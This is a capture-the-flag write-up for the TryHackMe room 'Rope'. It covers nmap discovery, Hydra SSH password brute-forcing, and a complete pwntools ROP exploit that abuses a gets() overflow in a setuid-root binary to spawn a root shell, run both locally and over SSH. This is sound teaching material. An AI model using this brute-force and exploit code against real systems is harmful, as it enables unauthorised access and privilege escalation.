# THM Rope Writeup

Here is the writeup for Rope, the first room I created on TryHackMe.
We'll see how a buffer overflow can be exploited to escalate privileges.

## Discovery
First, let's start the machine with Nmap

    nmap -sV 10.10.175.61

We can see we only have a SSH server running, on port 22.

## User flag
The room description states that Scott, the DBA, probably didn't change his password for the last 40 years.
If you are familiar with Oracle database and its documentation, you probably knows who Scott is, and his password 😉  - if not, you can simply use Google and search for "Scott password".

_Or_ you can use Hydra :

    hydra -l scott -P /usr/share/wordlists/rockyou.txt ssh://10.10.175.61

It might be a bit longer - depending on the wordlist you use - but you'll get the same answer eventually.

    [22][ssh] host: 10.10.175.61   login: scott   password: xxxxxx

Now, let's connect and get the user flag :

    ssh scott@10.10.175.61
    scott@10.10.175.61's password: 
    [scott@ip-10-10-175-61 ~]$ ls -l
    total 1688
    -rwsr-sr-x. 1 root  root  1716632 Apr 26 10:25 ask_admin
    -rw-r--r--. 1 scott scott     273 Apr 26 09:45 ask_admin.c
    -rw-r--r--. 1 scott scott      38 Apr 26 10:45 user.txt
    [scott@ip-10-10-175-61 ~]$ cat user.txt
    THM{xxxxxxxxxxxxxxxxxxxxxx}

## Root flag
We also have a "root +s" executable here ! But it doesn't seem very useful...

    This program should not be used anymore.
    Press Enter to continue

We even have the source code !

    #include <stdio.h>
    #include <stdlib.h>
    
    int main() {
    
            char buffer[32];
    
            //Note: this is too risky... we'll find another way
            /*
            setuid(0);
            execve("/bin/sh");
            */
            puts("This program should not be used anymore.\nPress Enter to continue");
            gets(buffer); 
    }
The admin initially wanted to give someone extended permissions, and finally commented the code.
Also, we can see there is a buffer overflow opportunity here : there is a call to _gets_ that we may exploit.

Let's retrieve this binary locally. We can analyse it with checksec

    pwn checksec ask_admin
    [*] '/root/ask_admin'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)

    file ask_admin
    ask_admin: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=8690ce8521e9cdc21d0313c4ebdbaf13fad4078a, not stripped, too many notes (256)

Partial RELRO, and No PIE. And no possibility to return to libc.

### Validate buffer overflow
First, let's see if we can exploit this buffer overflow.
The offset to exploit the instruction pointer should be 32 + 8 = 40, and we can easily check this, with gdb

    (gdb) run <<< $(python -c "print('a'*32 + 'b'*8 + 'c'*8)")
    Starting program: /root/ask_admin <<< $(python -c "print('a'*32 + 'b'*8 + 'c'*8)")
    This program should not be used anymore.
    Press Enter to continue
    
    Program received signal SIGSEGV, Segmentation fault.
    0x0000000000400b8e in main ()
    (gdb) info registers rbp
    rbp            0x6262626262626262  0x6262626262626262

The rbp register contains only b's, and the returning address lies just after.
Also, we can see that checksec was wrong: we have a segmentation fault, so there is no canary here! 
### Exploiting the buffer overflow : ROP
ROP (Return-Oriented programming) is an exploit technique that allows us to pick some instructions here and there from the program itself (or its dependencies) to achieve what we want.
These instructions are named "gadgets", and a gadget generally looks like this:

    asm instruction 1;
    asm instruction 2;
    ...
    ret;

One or many ASM instructions, always followed by a "ret" one. This is the key point to execute other gadgets.

For example, let's say we want to set registers rax to 0xC0FF33 and rdi to 0x50DA.
We know that the asm binary for "pop rax; ret;" exists somewhere in our executable at address 0x1234.
Same, "pop rdi; ret" exists at address 0x5678.
Let's put then on our stack the following values
```
3412000000000000 -- address of a "pop rax; ret"
33FFC00000000000 -- 0xC0FF33
7856000000000000 -- address of a "pop rdi; ret"
DA50000000000000 -- 0x50DA
xxxxxxxxxxxxxxxx -- address of our next gadget, if any
```
When the corrupted RET is executed, we jump to 0x1234
Stack is now :
```
33FFC00000000000 -- 0xC0FF33
7856000000000000 -- address of a "pop rdi; ret"
DA50000000000000 -- 0x50DA
xxxxxxxxxxxxxxxx -- address of our next gadget, if any
```
Then, we execute the next instruction, at 0x1234 : pop rax ---> we will set rax to 0xC0FF33, and stack will be
```
7856000000000000 -- address of a "pop rdi; ret"
DA50000000000000 -- 0x50DA
xxxxxxxxxxxxxxxx -- address of our next gadget, if any
```
The next instruction (after "pop rax") was "ret" ---> we jump to 0x5678, and stack is
```
DA50000000000000 -- 0x50DA
xxxxxxxxxxxxxxxx -- address of our next gadget, if any
```
Then, at 0x5678, we execute "pop rdi" ---> we set rdi to 0x50DA; and then a "ret" to go to our next gadget.
This sequence is named the ROP chain. Let's build ours
### Defining our ROP chain
The commented code in the source file is interesting. Even if it can't be used anymore, why not trying to mimic it ? We may be able to do some syscalls to setuid(0) and execve("/bin/sh") !
There is a nice cheat sheet [here](https://github.com/Hackndo/misc/blob/master/syscalls64.md).
According to that page, we can easily do
* setuid(0) : rax = 105, rdi = 0, then execute a syscall
* execve("/bin/sh") : rax = 59, rdi points at "/bin/sh", rsi and rdx points at 0x0000, then execute a syscall
### Building our ROP chain
Hopefully, there are useful libs to create a ROP chain, like Python's Pwntools.
```python
#!/usr/bin/python3  
from pwn import *

# We load our binary and start a ROP chain
elf = context.binary=ELF("./ask_admin", checksec = False)  
rop = ROP(elf)  

# Start the process and read stdin until it's our turn
p = process("./ask_admin")
p.clean()  
  
# Let's build our chain. First: setuid(0)
# This will find a gadget to set rax to 105, put this address on the stack; then put 105
rop.rax = 105 
# And same for rdi
rop.rdi = 0  
# We need a syscall + ret. We scan "elf", our binary, to find one.
rop.raw(next(elf.search(asm('syscall ; ret;'))))  
  
# Next step: execve("/bin/sh")

# First parameter: rdi points at /bin/sh
# We will put the "/bin/sh" string in the writeable .data section
data_section = elf.get_section_by_name('.data').header.sh_addr 

# We put our (small enough) text in rdx, the target destination in rdi...
rop.rdx = b"/bin/sh\x00"  
rop.rdi = data_section  
# ... and we find and add a gadget to move rdx's value where rdi points at
rop.raw(next(elf.search(asm('mov qword ptr [rdi], rdx; ret;'))))  

# Second and third parameters : rsi and rdx point at 0
# We set rax to 0, rsi and rdx in .data (just after our chain)
rop.rax = 0  
rop.rsi = rop.rdx = data_section + 8  
# And we move rax's value (so, 0) there.
rop.raw(next(elf.search(asm('mov qword ptr [rsi], rax; ret;'))))  

# Last one : rax = 59, then syscall
rop.rax = 59  
rop.raw(rop.syscall.address)  

# This will shows how much work we saved :-)  
print(rop.dump())  

# Build and push the payload
# (remember, offset is 40-byte-long : 32 for the buffer, 8 for the rbp)
payload = b"a" * 40 + rop.chain()
p.sendline(payload)  

# Switch to interactive mode to play with our shell.
p.interactive()
```

And that's it. Let's start our exploit locally :
```
./exploit.py 
[*] Loading gadgets for '/root/ask_admin'
[+] Starting local process './ask_admin': pid 22613
0x0000:         0x43e350 pop rax; ret
0x0008:             0x69
0x0010:         0x400cb8 pop rdi; ret
0x0018:              0x0
0x0020:         0x464bb9 syscall; ret
0x0028:         0x403ca2 pop rdx; ret
0x0030:   b'/bin/sh\x00' b'/bin/sh\x00'
0x0038:         0x400cb8 pop rdi; ret
0x0040:         0x6a70e0 data_start
0x0048:         0x429573
0x0050:         0x43e350 pop rax; ret
0x0058:              0x0
0x0060:         0x406ba8 pop rsi; ret
0x0068:         0x6a70e8 __x86_rep_stosb_threshold
0x0070:         0x403ca2 pop rdx; ret
0x0078:         0x6a70e8 __x86_rep_stosb_threshold
0x0080:         0x43fe05
0x0088:         0x43e350 pop rax; ret
0x0090:             0x3b
0x0098:         0x401c8d syscall
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root),112(kismet)
```
It works 👍 
And you can see the content of the stack : a lot of work saved 😊 
### Escalate privileges
Python is not available on the remote server. This is not a problem ! Pwntools supports SSH too !
We just have to replace
```
p = process("./ask_admin")
```
by 
```
s = ssh(host="10.10.175.61", user="scott", password="xxxxxxxxx")
p = s.run("./ask_admin")
```
And that's it !
```
./exploit.py 
[*] Loaded 128 cached gadgets for './ask_admin'
[+] Connecting to 10.10.175.61 on port 22: Done
[*] scott@10.10.175.61:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: './ask_admin': Done
[*] Switching to interactive mode
bash-4.4# $ id
uid=0(root) gid=1000(scott) groups=1000(scott) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.4# $ ls /root
root.txt
bash-4.4# $ cat /root/root.txt
THM{xxxxxxxxxxxxxxxxxx}
```
